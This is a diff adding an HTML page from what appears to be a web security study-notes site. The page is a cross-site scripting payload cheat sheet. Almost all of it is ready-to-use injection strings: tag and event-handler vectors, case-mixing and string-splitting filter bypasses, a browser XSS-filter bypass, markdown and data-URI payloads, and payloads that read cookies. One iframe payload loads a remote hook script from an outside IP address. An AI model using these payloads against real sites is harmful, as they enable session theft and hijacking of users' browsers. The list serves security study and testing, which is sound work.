@@ -1,0 +1,256 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en-US" data-content_root="../../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Payload &mdash; Web Security Study Notes 1.0 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=fa44fd50" />
+      <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=e59714d7" />
+
+  
+      <script src="../../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../../_static/documentation_options.js?v=4042127e"></script>
+      <script src="../../_static/doctools.js?v=9bcbadda"></script>
+      <script src="../../_static/sphinx_highlight.js?v=dc90522c"></script>
+    <script src="../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../index.html" class="icon icon-home">
+            Web Security Study Notes
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Content index:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../basic/index.html">1. Introduction</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../network/index.html">2. Computer network and protocol</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../info/index.html">3. Information collection</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../language/index.html">4. Language and framework</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../intranet/index.html">5. Intranet penetration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../cloud/index.html">6. Cloud Security</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../defense/index.html">7. Defense Technology</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../auth/index.html">8. Authentication mechanism</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tools/index.html">9. Tools and resources</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../manual/index.html">10. Quick manual check</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../misc/index.html">11. other</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">Web Security Study Notes</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">Payload</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../_sources/vuln/xss/payload.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="payload">
+<h1>Payload<a class="headerlink" href="#payload" title="Link to this heading"></a></h1>
+<section id="commonly-used">
+<h2>Commonly used<a class="headerlink" href="#commonly-used" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;svg</span> <span class="pre">onload=alert(document.domain)&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;img</span> <span class="pre">src=document.domain</span> <span class="pre">onerror=alert(document.domain)&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;M</span> <span class="pre">onmouseover=alert(document.domain)&gt;M</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;marquee</span> <span class="pre">onscroll=alert(document.domain)&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;a</span> <span class="pre">href=javascript:alert(document.domain)&gt;M&lt;/a&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;body</span> <span class="pre">onload=alert(document.domain)&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;details</span> <span class="pre">open</span> <span class="pre">ontoggle=alert(document.domain)&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;embed</span> <span class="pre">src=javascript:alert(document.domain)&gt;</span></code></p></li>
+</ul>
+</section>
+<section id="case-bypass">
+<h2>Case bypass<a class="headerlink" href="#case-bypass" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;alert(1)&lt;/script&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;sCrIpT&gt;alert(1)&lt;/sCrIpT&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;sCrIpT&gt;alert(1)&lt;/ScRiPt&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;img</span> <span class="pre">src=1</span> <span class="pre">onerror=alert(1)&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;iMg</span> <span class="pre">src=1</span> <span class="pre">oNeRrOr=alert(1)&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;ImG</span> <span class="pre">src=1</span> <span class="pre">OnErRoR=alert(1)&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;img</span> <span class="pre">src=1</span> <span class="pre">onerror=&quot;alert(&quot;M&quot;)&quot;&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;marquee</span> <span class="pre">onscroll=alert(1)&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;mArQuEe</span> <span class="pre">OnScRoLl=alert(1)&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;MaRqUeE</span> <span class="pre">oNsCrOlL=alert(1)&gt;</span></code></p></li>
+</ul>
+</section>
+<section id="various-alerts">
+<h2>Various alerts<a class="headerlink" href="#various-alerts" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;alert(1)&lt;/script&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;confirm(1)&lt;/script&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;prompt(1)&lt;/script&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;alert('1')&lt;/script&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;alert(&quot;1&quot;)&lt;/script&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;alert`1`&lt;/script&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;(alert)(1)&lt;/script&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;a=alert,a(1)&lt;/script&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;[1].find(alert)&lt;/script&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](1)&lt;/script&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;top[&quot;a&quot;+&quot;l&quot;+&quot;e&quot;+&quot;r&quot;+&quot;t&quot;](1)&lt;/script&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;top[/al/.source+/ert/.source](1)&lt;/script&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)&lt;/script&gt;</span></code></p></li>
+</ul>
+</section>
+<section id="pseudo-protocol">
+<h2>Pseudo-Protocol<a class="headerlink" href="#pseudo-protocol" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;a</span> <span class="pre">href=javascript:/0/,alert(%22M%22)&gt;M&lt;/a&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;a</span> <span class="pre">href=javascript:/00/,alert(%22M%22)&gt;M&lt;/a&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;a</span> <span class="pre">href=javascript:/000/,alert(%22M%22)&gt;M&lt;/a&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;a</span> <span class="pre">href=javascript:/M/,alert(%22M%22)&gt;M&lt;/a&gt;</span></code></p></li>
+</ul>
+</section>
+<section id="chrome-xss-auditor-bypass">
+<h2>Chrome XSS auditor bypass<a class="headerlink" href="#chrome-xss-auditor-bypass" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">?param=https://&amp;param=&#64;z.exeye.io/import%20rel=import%3E</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;base</span> <span class="pre">href=javascript:/M/&gt;&lt;a</span> <span class="pre">href=,alert(1)&gt;M&lt;/a&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;base</span> <span class="pre">href=javascript:/M/&gt;&lt;iframe</span> <span class="pre">src=,alert(1)&gt;&lt;/iframe&gt;</span></code></p></li>
+</ul>
+</section>
+<section id="length-limit">
+<h2>Length limit<a class="headerlink" href="#length-limit" title="Link to this heading"></a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="n">s</span><span class="o">+=</span><span class="s2">&quot;l&quot;</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+<p>...
+&lt;script&gt;eval(s)&lt;/script&gt;</p>
+</section>
+<section id="jquery-sourcemappingurl">
+<h2>jquery sourceMappingURL<a class="headerlink" href="#jquery-sourcemappingurl" title="Link to this heading"></a></h2>
+<p><code class="docutils literal notranslate"><span class="pre">&lt;/textarea&gt;&lt;script&gt;var</span> <span class="pre">a=1//&#64;</span> <span class="pre">sourceMappingURL=//xss.site&lt;/script&gt;</span></code></p>
+</section>
+<section id="image-name">
+<h2>Image name<a class="headerlink" href="#image-name" title="Link to this heading"></a></h2>
+<p><code class="docutils literal notranslate"><span class="pre">&quot;&gt;&lt;img</span> <span class="pre">src=x</span> <span class="pre">onerror=alert(document.cookie)&gt;.gif</span></code></p>
+</section>
+<section id="expired-payload">
+<h2>Expired payload<a class="headerlink" href="#expired-payload" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>src=javascript:alert is basically not available</p></li>
+<li><p>CSS Expression feature is only available in older versions</p></li>
+</ul>
+</section>
+<section id="css">
+<h2>css<a class="headerlink" href="#css" title="Link to this heading"></a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">div</span> <span class="n">style</span><span class="o">=</span><span class="s2">&quot;background-image:url(javascript:alert(/xss/))&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">STYLE</span><span class="o">&gt;</span><span class="nd">@import</span><span class="s1">&#39;http://ha.ckers.org/xss.css&#39;</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">STYLE</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+</section>
+<section id="markdown">
+<h2>markdown<a class="headerlink" href="#markdown" title="Link to this heading"></a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">a</span><span class="p">](</span><span class="n">javascript</span><span class="p">:</span><span class="n">prompt</span><span class="p">(</span><span class="n">document</span><span class="o">.</span><span class="n">cookie</span><span class="p">))</span>
+<span class="p">[</span><span class="n">a</span><span class="p">](</span><span class="n">j</span>    <span class="n">a</span>   <span class="n">v</span>   <span class="n">a</span>   <span class="n">s</span>   <span class="n">c</span>   <span class="n">r</span>   <span class="n">i</span>   <span class="n">p</span>   <span class="n">t</span><span class="p">:</span><span class="n">prompt</span><span class="p">(</span><span class="n">document</span><span class="o">.</span><span class="n">cookie</span><span class="p">))</span>
+</pre></div>
+</div>
+<p>&lt;”
+![a’”<a href="#id1"><span class="problematic" id="id2">`</span></a>onerror=prompt(document.cookie)](x)
+[notmalicious](<a class="reference external" href="javascript:window.onerror=alert;throw%20document.cookie">javascript:window.onerror=alert;throw%20document.cookie</a>)
+[a](<a class="reference external" href="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=">data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=</a>)
+![a](<a class="reference external" href="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=">data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=</a>)</p>
+</section>
+<section id="iframe">
+<h2>iframe<a class="headerlink" href="#iframe" title="Link to this heading"></a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">iframe</span> <span class="n">onload</span><span class="o">=</span><span class="s1">&#39;</span>
+</pre></div>
+</div>
+<p>var sc   = document.createElement(“scr” + “ipt”);
+sc.type  = “text/javascr” + “ipt”;
+sc.src   = “<a class="reference external" href="http://1.2.3.4/js/hook.js">http://1.2.3.4/js/hook.js</a>”;
+document.body.appendChild(sc);
+‘
+/&gt;</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;iframe</span> <span class="pre">src=javascript:alert(1)&gt;&lt;/iframe&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;iframe</span> <span class="pre">src=&quot;data:text/html,&lt;iframe</span> <span class="pre">src=javascript:alert('M')&gt;&lt;/iframe&gt;&quot;&gt;&lt;/iframe&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;iframe</span> <span class="pre">src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+&gt;&lt;/iframe&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;iframe</span> <span class="pre">srcdoc=&lt;svg/onload&amp;equals;alert&amp;lpar;1)&gt;&gt;&lt;/iframe&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;iframe</span> <span class="pre">src=https://baidu.com</span> <span class="pre">width=1366</span> <span class="pre">height=768&gt;&lt;/iframe&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;iframe</span> <span class="pre">src=javascript:alert(1)</span> <span class="pre">width=1366</span> <span class="pre">height=768&gt;&lt;/iframe</span></code></p></li>
+</ul>
+</section>
+<section id="form">
+<h2>form<a class="headerlink" href="#form" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;form</span> <span class="pre">action=javascript:alert(1)&gt;&lt;input</span> <span class="pre">type=submit&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;form&gt;&lt;button</span> <span class="pre">formaction=javascript:alert(1)&gt;M</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;form&gt;&lt;input</span> <span class="pre">formaction=javascript:alert(1)</span> <span class="pre">type=submit</span> <span class="pre">value=M&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;form&gt;&lt;input</span> <span class="pre">formaction=javascript:alert(1)</span> <span class="pre">type=image</span> <span class="pre">value=M&gt;</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&lt;form&gt;&lt;input</span> <span class="pre">formaction=javascript:alert(1)</span> <span class="pre">type=image</span> <span class="pre">src=1&gt;</span></code></p></li>
+</ul>
+</section>
+<section id="meta">
+<h2>meta<a class="headerlink" href="#meta" title="Link to this heading"></a></h2>
+<p><code class="docutils literal notranslate"><span class="pre">&lt;META</span> <span class="pre">HTTP-EQUIV=&quot;Link&quot;</span> <span class="pre">Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;;</span> <span class="pre">REL=stylesheet&quot;&gt;</span></code></p>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2025-2025, Lyle.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
